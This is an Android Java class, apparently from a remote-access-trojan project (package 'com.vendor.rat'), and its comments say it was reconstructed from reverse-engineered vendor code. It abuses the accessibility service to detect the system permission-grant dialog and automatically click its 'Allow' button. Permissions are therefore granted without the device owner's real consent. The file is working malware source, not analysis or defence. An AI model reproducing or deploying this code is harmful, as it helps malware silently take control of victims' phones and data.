package com.vendor.rat.auto.engine;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * 权限授予自动配对代理
 *
 * 基于逆向: o/l.java (71行) — 最简单的 Delegate
 *
 * 监听 GrantPermissionsActivity (AOSP + permissioncontroller)
 * 自动点击"允许"按钮
 *
 * 字段对齐:
 *   f670o → SYNTHETIC_FLAG (static)
 *   f671n → processedActions (ConcurrentLinkedQueue)
 *
 * 方法对齐:
 *   H() → GrantPermissionsActivity (packageinstaller)
 *   I() → GrantPermissionsActivity (permissioncontroller)
 *   J() → buildWindowMatchers (H + I)
 *   d() → destroy
 *   u() → onAccessibilityEvent
 */
public class PairAccessibilityDelegate extends AutoEngine {

    private static final String TAG = "PairAccessibility";

    // vendor o/l.java 构造: super(J(), "com.android.permissioncontroller")
    private static final String PERMISSION_CONTROLLER = "com.android.permissioncontroller";

    // Activity — vendor H()/I()
    private static final String GRANT_PERMS_INSTALLER =
        "com.android.packageinstaller.permission.ui.GrantPermissionsActivity";
    private static final String GRANT_PERMS_CONTROLLER =
        "com.android.permissioncontroller.permission.ui.GrantPermissionsActivity";

    // State
    private static final String ST_ALLOW_GRANT = "allowInGrantPermission";

    // 字段 — vendor f671n
    private final ConcurrentLinkedQueue<String> processedActions = new ConcurrentLinkedQueue<>();

    public PairAccessibilityDelegate() {
        super(buildWindowMatchers(), PERMISSION_CONTROLLER);
    }

    // ====== ListenWindow — 对应 vendor J() 行 35-40 ======

    private static List<WindowMatcher> buildWindowMatchers() {
        List<WindowMatcher> list = new ArrayList<>();
        // vendor H(): packageinstaller GrantPermissionsActivity
        list.add(new WindowMatcher(null, GRANT_PERMS_INSTALLER)
            .addEventType(32).addEventType(16384));
        // vendor I(): permissioncontroller GrantPermissionsActivity
        list.add(new WindowMatcher(null, GRANT_PERMS_CONTROLLER)
            .addEventType(32).addEventType(16384));
        return list;
    }

    // ====== 抽象方法实现 ======

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // vendor 不使用回调模式
    }

    @Override
    public void execute() {
        // vendor 无独立 execute, 由事件驱动
    }

    // ====== 事件处理 — 对应 vendor u() 行 49-70 ======

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                     String className) {
        // vendor u():51 — super.u()
        super.onAccessibilityEvent(event, packageName, className);

        // vendor u():53-56 — 检查 H()+I() 窗口
        List<WindowMatcher> targets = new ArrayList<>();
        targets.add(new WindowMatcher(null, GRANT_PERMS_INSTALLER)
            .addEventType(32).addEventType(16384));
        targets.add(new WindowMatcher(null, GRANT_PERMS_CONTROLLER)
            .addEventType(32).addEventType(16384));

        boolean matched = matchesAny(targets);
        if (matched) {
            Log.d(TAG, "已进入是否允许权限申请窗口");
        }

        // vendor u():62-68 — 入队 + 执行任务
        if (matched) {
            if (!processedActions.contains(ST_ALLOW_GRANT)) {
                processedActions.add(ST_ALLOW_GRANT);
                // vendor: l.c(new a(this, 2), this.c)
                scheduler.execute(new Runnable() {
                    @Override public void run() { handleGrantPermission(); }
                });
            }
        }
    }

    // ====== 任务处理 — 对应 vendor a(this, 2) case 2 ======

    /**
     * 自动点击"允许"按钮
     * vendor Runnable a case 2: 使用 PermissionAutoGrantEngine 的逻辑
     */
    private void handleGrantPermission() {
        try {
            activateRoot();
            com.vendor.rat.auto.entity.UiNode root = k();
            if (root == null) return;

            // 查找允许按钮
            com.vendor.rat.auto.entity.UiNode allowBtn = root.findOneByCombine(
                com.vendor.rat.auto.condition.CombineFilter.button("允许"));
            if (allowBtn != null && allowBtn.click()) {
                Log.d(TAG, "已点击允许权限按钮");
            }
            processedActions.remove(ST_ALLOW_GRANT);
        } catch (Exception e) {
            logError("handleGrantPermission", e);
            processedActions.remove(ST_ALLOW_GRANT);
        }
    }

    // ====== destroy — 对应 vendor d() 行 42-47 ======

    @Override
    public void destroy() {
        processedActions.clear();
        super.destroy();
    }

    // ====== equals/hashCode ======

    @Override
    public boolean equals(Object obj) {
        return obj instanceof PairAccessibilityDelegate;
    }

    @Override
    public int hashCode() {
        return Objects.hash(PairAccessibilityDelegate.class.getName());
    }
}
